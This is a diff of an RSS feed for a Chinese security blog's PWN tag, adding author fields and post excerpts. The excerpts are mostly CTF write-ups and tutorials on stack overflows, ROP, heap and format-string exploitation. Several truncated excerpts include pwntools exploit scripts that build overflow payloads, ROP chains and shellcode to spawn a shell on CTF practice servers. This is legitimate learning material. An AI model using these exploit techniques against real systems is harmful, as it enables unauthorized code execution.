@@ -6,154 +6,156 @@
     <description>Recent content in PWN on Ghostasky&#39;s Blog</description>
     <generator>Hugo</generator>
     <language>zh-CN</language>
+    <managingEditor>wt20wl@gmail.com (Ghostasky)</managingEditor>
+    <webMaster>wt20wl@gmail.com (Ghostasky)</webMaster>
     <lastBuildDate>Sun, 16 Jul 2023 00:00:00 +0000</lastBuildDate>
     <atom:link href="http://ghostasky.github.io/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Linux Kernel Pwn</title>
       <link>http://ghostasky.github.io/posts/2023-7-linuxkernelpwn/</link>
-      <pubDate>Sun, 16 Jul 2023 00:00:00 +0000</pubDate>
+      <pubDate>Sun, 16 Jul 2023 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/2023-7-linuxkernelpwn/</guid>
-      <description></description>
+      <description>&lt;p&gt;坟墓里寂静无比，埋葬你的是你所有没说出口的话&lt;/p&gt;</description>
     </item>
     <item>
       <title>BUU_PWN刷题_0x40-0x4F</title>
       <link>http://ghostasky.github.io/posts/buu-pwn-0x40-0x4f/</link>
-      <pubDate>Sun, 17 Oct 2021 00:00:00 +0000</pubDate>
+      <pubDate>Sun, 17 Oct 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/buu-pwn-0x40-0x4f/</guid>
-      <description></description>
+      <description>[TOC] 0x40.ciscn_2019_s_9 看下检查,全没开 yutao@ubuntu:~/Desktop$ checksec ./ciscn_s_9 [*] &amp;#39;/home/yutao/Desktop/ciscn_s_9&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments int pwn() { char s[24]; // [esp+8h] [ebp-20h] BYREF puts(&amp;#34;\nHey! ^_^&amp;#34;); puts(&amp;#34;\nIt&amp;#39;s nice to meet you&amp;#34;); puts(&amp;#34;\nDo you have anything to tell?&amp;#34;); puts(&amp;#34;&amp;gt;&amp;#34;); fflush(stdout); fgets(s, 50, stdin); puts(&amp;#34;OK bye~&amp;#34;); fflush(stdout); return 1; } 有可用的gadget： .text:08048551 hint proc near .text:08048551 ; __unwind { .text:08048551 push ebp .text:08048552 mov ebp, esp .text:08048554 jmp esp .text:08048554 hint endp 直接写shellcode的话会太长，那么</description>
     </item>
     <item>
       <title>IO_FILE调试&#43;详解</title>
       <link>http://ghostasky.github.io/posts/io_file/</link>
-      <pubDate>Fri, 24 Sep 2021 23:09:51 +0000</pubDate>
+      <pubDate>Fri, 24 Sep 2021 23:09:51 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/io_file/</guid>
-      <description></description>
+      <description>[TOC] 开始干__IO_FILE。会依次调fopen,fwrite,fread之类的IO函数的源码。 IO_FILE之fopen详解 demo程序 ##include&amp;lt;stdio.h&amp;gt; int main() { FILE*fp=fopen(&amp;#34;test&amp;#34;,&amp;#34;wb&amp;#34;); char *ptr=malloc(0x20); return 0; } 源码分析 跟进去之后可以看到fopen实际是_IO_new_fopen函数。它调用的是</description>
     </item>
     <item>
       <title>Tcache_stashing_unlink_atack调试记录</title>
       <link>http://ghostasky.github.io/posts/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/</link>
-      <pubDate>Wed, 01 Sep 2021 00:00:00 +0000</pubDate>
+      <pubDate>Wed, 01 Sep 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/</guid>
-      <description></description>
+      <description>代码是how2heap中libc2.27的代码 ##include &amp;lt;stdio.h&amp;gt; ##include &amp;lt;stdlib.h&amp;gt; ##include &amp;lt;assert.h&amp;gt; int main(){ unsigned long stack_var[0x10] = {0}; unsigned long *chunk_lis[0x10] = {0}; unsigned long *target; setbuf(stdout, NULL); printf(&amp;#34;This file demonstrates the stashing unlink attack on tcache.\n\n&amp;#34;); printf(&amp;#34;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&amp;#34;); printf(&amp;#34;This technique can be used when you are able to overwrite the victim-&amp;gt;bk pointer. Besides, it&amp;#39;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&amp;#34;); printf(&amp;#34;The mechanism of putting smallbin into tcache in glibc gives us a chance to</description>
     </item>
     <item>
       <title>PWN刷题小结</title>
       <link>http://ghostasky.github.io/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/</link>
-      <pubDate>Sun, 08 Aug 2021 00:00:00 +0000</pubDate>
+      <pubDate>Sun, 08 Aug 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/</guid>
-      <description></description>
+      <description>[toc] 1.杂 Ubuntu 18下偶尔会发生栈无法对齐的情况，多retn几次就好了。 strlen()函数来判断输入的长度，遇到&#39;\x00&#39;时会终止，而gets()函数遇到&#39;\x00&#39;并不会截断 sys,write,puts,printf system(&amp;quot;/binsh&amp;quot;) p32(e.plt[&amp;#39;system&amp;#39;]) + p32(0xdeadbeef) + p32(sh_addr) p64(pop_rdi_ret) + p64(sh_addr) + p64(e.sym[&amp;#39;system&amp;#39;]) p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_plt) + p64(0xdeadbeef) write:输出，read（</description>
     </item>
     <item>
       <title>BUU_PWN刷题_0x30-0x3F</title>
       <link>http://ghostasky.github.io/posts/buu-pwn-0x30-0x3f/</link>
-      <pubDate>Sun, 18 Jul 2021 00:00:00 +0000</pubDate>
+      <pubDate>Sun, 18 Jul 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/buu-pwn-0x30-0x3f/</guid>
-      <description></description>
+      <description>[TOC] 0x30.jarvisoj_level1 ssize_t vulnerable_function() { char buf[136]; // [esp+0h] [ebp-88h] BYREF printf(&amp;#34;What&amp;#39;s this:%p?\n&amp;#34;, buf); return read(0, buf, 0x100u); } tmd，这题给的题目和平台的题不太一样，正常这道题的exp： from pwn import * context(log_level=&amp;#39;debug&amp;#39;) io = process(&amp;#34;./level1&amp;#34;) ##io = remote(&amp;#34;node4.buuoj.cn&amp;#34;,29905) buf_addr = int(io.recv()[-12:-2],16) payload = asm(shellcraft.sh()) payload +=(0x88+4-len(asm(shellcraft.sh())))*&amp;#39;a&amp;#39; + p32(buf_addr) print hex(buf_addr) io.sendline(payload) io.interactive() 只能ret2libc了： from pwn import * context(log_level=&amp;#39;debug&amp;#39;) ##io = process(&amp;#34;./level1&amp;#34;) elf = ELF(&amp;#34;./level1&amp;#34;) libc = ELF(&amp;#34;./libc-2.23.so&amp;#34;) io = remote(&amp;#34;node4.buuoj.cn&amp;#34;,29905) payload = (0x88+4)*&amp;#39;a&amp;#39; + p32(elf.plt[&amp;#39;write&amp;#39;])+p32(elf.sym[&amp;#39;main&amp;#39;])+p32(1)+p32(elf.got[&amp;#39;read&amp;#39;])+p32(4) io.sendline(payload) read = u32(io.recv(4)) base = read - libc.sym[&amp;#39;read&amp;#39;] system_add = base</description>
     </item>
     <item>
       <title>BUU_PWN刷题_0x21-0x2F</title>
       <link>http://ghostasky.github.io/posts/buu-pwn-0x20-0x2f/</link>
-      <pubDate>Sun, 11 Jul 2021 00:00:00 +0000</pubDate>
+      <pubDate>Sun, 11 Jul 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/buu-pwn-0x20-0x2f/</guid>
-      <description></description>
+      <description>[TOC] 0x20.jarvisoj_level3_x64 ret2libc from pwn import * context(log_level=&amp;#39;debug&amp;#39;) ##io = process(&amp;#34;./level3_x64&amp;#34;) io = remote(&amp;#34;node3.buuoj.cn&amp;#34;,29779) elf = ELF(&amp;#34;./level3_x64&amp;#34;) libc = ELF(&amp;#34;./libc-x64-2.23.so&amp;#34;) write_plt = elf.plt[&amp;#39;write&amp;#39;] read_got = elf.got[&amp;#39;read&amp;#39;] main_addr = elf.sym[&amp;#39;main&amp;#39;] pop_rdi_ret = 0x4006b3 pop_rsi_r15_ret = 0x4006b1 io.recv() payload = &amp;#39;a&amp;#39;*(0x88)+ p64(pop_rdi_ret)+p64(1) payload += p64(pop_rsi_r15_ret) +p64(read_got)+p64(8)+p64(write_plt)+ p64(main_addr) io.sendline(payload) read_add = u64(io.recv()[0:8]) print hex(read_add) base = read_add - libc.symbols[&amp;#34;read&amp;#34;] sys_add = base + libc.symbols[&amp;#34;system&amp;#34;] bin_sh = base + libc.search(&amp;#34;/bin/sh&amp;#34;).next() payload = &amp;#39;a&amp;#39;*(0x88)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_add)+p64(main_addr) io.sendline(payload) io.interactive() 0x21.picoctf_2018_rop chain win1(): void win_function1() { win1 = 1; } win2(): int __cdecl win_function2(int a1) { int result; // eax result = (unsigned __int8)win1; if ( win1 &amp;amp;&amp;amp; a1 == 0xBAAAAAAD ) { win2 = 1; } else if ( win1 ) { result = puts(&amp;#34;Wrong Argument. Try Again.&amp;#34;);</description>
     </item>
     <item>
       <title>BUU_PWN刷题_0x01-0x0F</title>
       <link>http://ghostasky.github.io/posts/buu-pwn-0x01-0x0f/</link>
-      <pubDate>Tue, 01 Jun 2021 00:00:00 +0000</pubDate>
+      <pubDate>Tue, 01 Jun 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/buu-pwn-0x01-0x0f/</guid>
-      <description></description>
+      <description>0x1.test_your_nc nc一下就完事。 0x2.rip checksec： yutao@pwnbaby:~/Desktop$ checksec pwn1 [*] &amp;#39;/home/yutao/Desktop/pwn1&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments ida打开，有个后门函数：fun() 双击s到stack of main，15字节，exp： from pwn import * io = process(&amp;#34;./pwn1&amp;#34;) payload = &amp;#39;a&amp;#39;*(0xf + 8) + p64(0x40118a) ##具体86还是87/8a要看linux</description>
     </item>
     <item>
       <title>BUU_PWN刷题_0x10-0x1F</title>
       <link>http://ghostasky.github.io/posts/buu-pwn-0x10-0x1f/</link>
-      <pubDate>Tue, 01 Jun 2021 00:00:00 +0000</pubDate>
+      <pubDate>Tue, 01 Jun 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/buu-pwn-0x10-0x1f/</guid>
-      <description></description>
+      <description>[TOC] 0x10.[HarekazeCTF2019]baby_rop 没后门函数： int __cdecl main(int argc, const char **argv, const char **envp) { char v4[16]; // [rsp+0h] [rbp-10h] BYREF system(&amp;#34;echo -n \&amp;#34;What&amp;#39;s your name? \&amp;#34;&amp;#34;); __isoc99_scanf(&amp;#34;%s&amp;#34;, v4); printf(&amp;#34;Welcome to the Pwn World, %s!\n&amp;#34;, v4); return 0; } from pwn import * context(log_level=&amp;#39;DEBUG&amp;#39;) ##io = process(&amp;#34;./babyrop&amp;#34;) io = remote(&amp;#39;node3.buuoj.cn&amp;#39;,28280) elf = ELF(&amp;#39;./babyrop&amp;#39;) io.recv() sys_plt = elf.plt[&amp;#34;system&amp;#34;] pop_rdi_ret =0x0400683 bin_sh = 0x0601048 payload = &amp;#39;a&amp;#39;*0x18+ p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_plt)+p64(0xdeadbeef) io.sendline(payload) io.interactive() 0x11.jarvisoj_level2_x64 ssize_t vulnerable_function() { char buf[128]; // [rsp+0h] [rbp-80h] BYREF system(&amp;#34;echo Input:&amp;#34;); return read(0, buf, 0x200uLL); } 有/bin/sh字符串，没啥写的。 from pwn import * ##io = process(&amp;#34;./level2_x64&amp;#34;) io = remote(&amp;#39;node3.buuoj.cn&amp;#39;,28783) elf = ELF(&amp;#34;./level2_x64&amp;#34;) io.recv()</description>
     </item>
     <item>
       <title>CISCN_PWN</title>
       <link>http://ghostasky.github.io/posts/ciscn-pwn/</link>
-      <pubDate>Thu, 08 Apr 2021 00:00:00 +0000</pubDate>
+      <pubDate>Thu, 08 Apr 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/ciscn-pwn/</guid>
-      <description></description>
+      <description>[TOC] ciscn_2019_s_3 32位与64位 系统调用的区别： 1. 传参方式不同 2. 系统调用号 不同 3. 调用方式 不同 32位： 传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器 调用号：sys_read 的调用号 为 3</description>
     </item>
     <item>
       <title>在64位的glibc上payload调用system导致crash的问题</title>
       <link>http://ghostasky.github.io/posts/64%E4%BD%8Dpayload%E8%B0%83%E7%94%A8system%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/</link>
-      <pubDate>Thu, 08 Apr 2021 00:00:00 +0000</pubDate>
+      <pubDate>Thu, 08 Apr 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/64%E4%BD%8Dpayload%E8%B0%83%E7%94%A8system%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/</guid>
-      <description></description>
+      <description>[TOC] 在64位的glibc上payload调用system导致crash的问题 在一些64位的pwn题中，调用system后会导致程序crash掉 首先小讲下原因： .text:000000000040F93C mov [rsp+198h+var_190], rax .text:000000000040F941 movhps xmm0, [rsp+198h+var_190] .text:000000000040F946 movaps [rsp+198h+var_158], xmm0 .text:000000000040F94B call sigaction 是movaps [rsp+198h+var_158], xmm0指令要求rsp+198h+va</description>
     </item>
     <item>
       <title>Chunk Extend and Overlapping</title>
       <link>http://ghostasky.github.io/posts/chunk-extend-and-overlapping/</link>
-      <pubDate>Mon, 22 Mar 2021 00:00:00 +0000</pubDate>
+      <pubDate>Mon, 22 Mar 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/chunk-extend-and-overlapping/</guid>
-      <description></description>
+      <description>[TOC] Chunk Extend and Overlapping 介绍 chunk extend 是堆漏洞的一种常见利用手法，通过extend可以实现chunk overlapping（块重叠）的效果。这种利用的方法需要以下的条件： 程序中存在堆的漏洞 漏洞可以控制chunk header中的数据 原理 这种利用的技术能够产生在于</description>
     </item>
     <item>
       <title>堆中的off-by-one</title>
       <link>http://ghostasky.github.io/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/</link>
-      <pubDate>Sun, 21 Mar 2021 02:29:42 +0000</pubDate>
+      <pubDate>Sun, 21 Mar 2021 02:29:42 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/</guid>
-      <description></description>
+      <description>[TOC] 介绍 off-by-one是一种特殊的溢出漏洞，off-by-one指程序向缓冲区写入时，写入的字节数超过了这个缓冲区本身所申请的字节数，并且只越界了一个字节。 漏洞原理 这种漏洞的产生往往与边界严重不严格和字符串操作有关，其中边界验证不严通常</description>
     </item>
     <item>
       <title>简单堆溢出介绍</title>
       <link>http://ghostasky.github.io/posts/%E7%AE%80%E5%8D%95%E5%A0%86%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/</link>
-      <pubDate>Sun, 14 Mar 2021 00:58:32 +0000</pubDate>
+      <pubDate>Sun, 14 Mar 2021 00:58:32 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/%E7%AE%80%E5%8D%95%E5%A0%86%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/</guid>
-      <description></description>
+      <description>[TOC] 介绍 ​ 堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可用的字节数，因而导致了数据的溢出，并覆盖到了物理相邻的高地址的下一个堆块。 ​ so，堆溢出漏洞发生的前提： 写入的数据写到了堆上 写入数据的大小没有被控制 堆溢出是一种特定的缓冲区溢出（</description>
     </item>
     <item>
       <title>整数溢出</title>
       <link>http://ghostasky.github.io/posts/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</link>
-      <pubDate>Wed, 03 Mar 2021 11:17:41 +0000</pubDate>
+      <pubDate>Wed, 03 Mar 2021 11:17:41 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</guid>
-      <description></description>
+      <description>[TOC] 整数溢出介绍 C语言中整数的分类及各自的大小范围： 类型 字节 范围 short int 2byte(word) 0~32767(0~0x7fff) -32768~-1(0x8000~0xffff) unsigned short int 2byte(word) 0~65535(0~0xffff) int 4byte(word) 0~2147483647(0~0x7fffffff) -2147483648~-1(0x80000000~0xffffffff) unsigned int 4byte(word) 0~4294967295(0~0xffffffff) long 8byte(word) 正: 0~0x7fffffffffffffff 负: 0x8000000000000000~0xffffffffffffffff unsigned long 8byte(word) 0~0xffffffffffffffff 正是因为这些类型的大小范围的限制导致整数溢出。 整数溢出原理 整数溢出的异常有3种： 溢出 只有有符号数才会发生溢出。 溢出标志</description>
     </item>
     <item>
       <title>Ret2csu</title>
       <link>http://ghostasky.github.io/posts/ret2csu/</link>
-      <pubDate>Wed, 10 Feb 2021 00:00:00 +0000</pubDate>
+      <pubDate>Wed, 10 Feb 2021 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/ret2csu/</guid>
-      <description></description>
+      <description>ret2csu 原理 x64中，函数的前6个参数是通过寄存器传参的（ 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9），但是大多数情况下，我们很难找到每个寄存器对应的gadgets。这时，我们可以利用x64下的_libc_csu_init中的gadgets。这个函数</description>
     </item>
     <item>
       <title>Linux保护技术</title>
       <link>http://ghostasky.github.io/posts/linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/</link>
-      <pubDate>Tue, 02 Feb 2021 23:09:51 +0000</pubDate>
+      <pubDate>Tue, 02 Feb 2021 23:09:51 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/</guid>
-      <description></description>
+      <description>[TOC] linux保护技术 NX保护 作用： ​ 将数据（栈，堆）所在内存页标识为不可执行，当程序成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令 编译选项： 关闭： -z execstack 开启： -z noexecstack PIE保护 作用： ​ 使</description>
     </item>
     <item>
       <title>格式化字符串原理介绍及利用</title>
       <link>http://ghostasky.github.io/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8/</link>
-      <pubDate>Mon, 01 Feb 2021 18:31:36 +0000</pubDate>
+      <pubDate>Mon, 01 Feb 2021 18:31:36 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8/</guid>
-      <description></description>
+      <description>[TOC] 原理介绍 [INPUT]: printf(&amp;ldquo;Color %s,number %d,fload %4.2f&amp;rdquo;,&amp;ldquo;red&amp;rdquo;, 123456,3.14); [OUTPUT]:Color red,number 123456,float 3.14 格式化字符串函数 常见的有： 输入 scanf 输出 函数 基本介绍 printf 输出到stdout fprintf 输出到指定FILE流 vprintf 根据参数列表格式化输出到stdout vfprintf 根据参数列表格式化输出到指定 FILE 流 sprintf 输出到字符串 snprintf 输出指定字节数到字符串 vsprintf 根据参数</description>
     </item>
     <item>
       <title>PWN_Ret2libc</title>
       <link>http://ghostasky.github.io/posts/pwn-ret2libc/</link>
-      <pubDate>Thu, 28 Jan 2021 00:58:55 +0000</pubDate>
+      <pubDate>Thu, 28 Jan 2021 00:58:55 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/pwn-ret2libc/</guid>
-      <description></description>
+      <description>1.ret2libc1 先讲几个知识点： system函数属于libc，并且libc.so动态链接库中的函数之间相对偏移是固定的，即使打开ASLR也是如此。 PLT(Procedure Linkage Table)表中的数据不是函数的真实地址，带有@plt的函数起个过渡作用。 GOT(Global Offset Table)表中的数据才是</description>
     </item>
     <item>
       <title>PWN_ret2text,ret2syscall,ret2shellcode</title>
       <link>http://ghostasky.github.io/posts/pwn-ret2textret2syscallret2shellcode/</link>
-      <pubDate>Wed, 27 Jan 2021 11:32:16 +0000</pubDate>
+      <pubDate>Wed, 27 Jan 2021 11:32:16 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/pwn-ret2textret2syscallret2shellcode/</guid>
-      <description></description>
+      <description>1.Ret2text 首先file和checksec一下： ida打开： 观察到有个vulnerable()函数： 还有个后门函数：get_shell() gdb打开，main处下断点后跟进，输入12345678后查看stack： 此时ebp= 0xffffd108, 将黄色与红色全部覆盖后填</description>
     </item>
     <item>
       <title>BUU_PWN刷题_0x50-0x5F</title>
       <link>http://ghostasky.github.io/posts/buu-pwn-0x50-0x5f/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><author>wt20wl@gmail.com (Ghostasky)</author>
       <guid>http://ghostasky.github.io/posts/buu-pwn-0x50-0x5f/</guid>
-      <description></description>
+      <description>[TOC] 0x50.mrctf2020_shellcode_revenge（可见字符shellcode） 因为call的缘故，没办法f5. gwt@ubuntu:~/Desktop$ checksec mrctf2020_shellcode_revenge [*] &amp;#39;/home/gwt/Desktop/mrctf2020_shellcode_revenge&amp;#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments 大致流程: print(&amp;#34;Show me your magic!\n&amp;#34;); buf = read(0x400) if(!(0x60&amp;lt;input[i]&amp;lt;0x7A || 0x2F&amp;lt;input[i]&amp;lt;ox5A) print(&amp;#34;I Can&amp;#39;t Read This!&amp;#34;) buf() 于是： git clone https://github.com/TaQini/alpha3.git cd alpha3 //需要</description>
     </item>
   </channel>
 </rss>
